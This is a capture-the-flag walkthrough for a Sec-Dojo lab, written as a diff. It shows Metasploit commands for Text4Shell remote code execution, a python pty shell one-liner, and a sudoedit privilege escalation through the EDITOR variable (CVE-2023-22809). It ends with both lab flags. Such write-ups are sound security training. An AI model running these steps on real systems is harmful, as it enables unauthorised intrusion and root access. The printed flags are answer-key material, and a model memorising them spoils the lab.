@@ -1,0 +1,28 @@
+Sec-Dojo lab Text4shell 
+
+Hint: Text4Shell & CVE-2023-22809
+
+So we have 2 thinks. 
+--> About CVE-2023-22809 we search and we found that this vulnerability is used for priviliege escalation.
+--> About Text4shell, when we search on metasploit we found an exploit to do RCE(Remote code execution)
+
+==Exploiting Text4shell to gain access
+List of commands:
+	--> msfconsole
+	--> search text4shell
+	--> use exploit/multi/http/apache_commons_text4shell
+	--> set rhosts ip
+	--> set RPORT 8080
+	--> run
+After that you'll access to a meterpreter and type command shell to get a shell like linux one. 
+Atabilize the shell with python using command :
+--> python3 -c 'import pty;pty.spawn("/bin/bash")'
+--> cat flag.txt
+flag1 --> CVE_2022_42889_CVE_2023_22809_v2_group_13073-425ultnmbxgyzggu4myytjjupjze89w3
+
+
+==Priviliege escalation with CVE-2023-22809
+We'll use these commands 
+	--> export EDITOR="vim -- /root/proof.txt"
+	--> sudoedit /etc/hosts
+flag2 --> CVE_2022_42889_CVE_2023_22809_v2_group_13073-jvu4ecpb1epw79j96sqy1sfyirgyf902
